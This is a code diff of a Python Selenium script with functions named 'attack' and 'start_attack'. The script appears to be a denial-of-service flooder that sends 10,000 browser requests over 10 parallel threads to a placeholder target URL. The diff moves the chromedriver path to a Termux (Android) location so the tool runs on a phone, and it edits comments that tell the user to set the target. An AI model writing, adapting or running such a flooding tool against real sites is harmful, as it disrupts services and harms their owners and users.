@@ -13,7 +13,8 @@ chrome_options.add_experimental_option("useAutomationExtension", False)
 
 # ✅ Start Attack Function
 def attack(url, total_requests):
-    service = Service("/usr/local/bin/chromedriver")  # ✅ Path ঠিক করে দাও  # ✅ Change this to your chromedriver path
+    # Update path to chromedriver
+    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Correct path for Termux
     driver = webdriver.Chrome(service=service, options=chrome_options)
 
     for _ in range(total_requests):
@@ -39,7 +40,7 @@ def start_attack(url, total_requests, threads):
 
 # ✅ Run Attack
 if __name__ == "__main__":
-    target_url = "https://target-website.com"  # ✅ Change this
+    target_url = "https://target-website.com"  # ✅ Change this to the target URL
     total_requests = 10000  # ✅ Number of total requests
     threads = 10  # ✅ Number of Threads (Parallel Attacks)
     
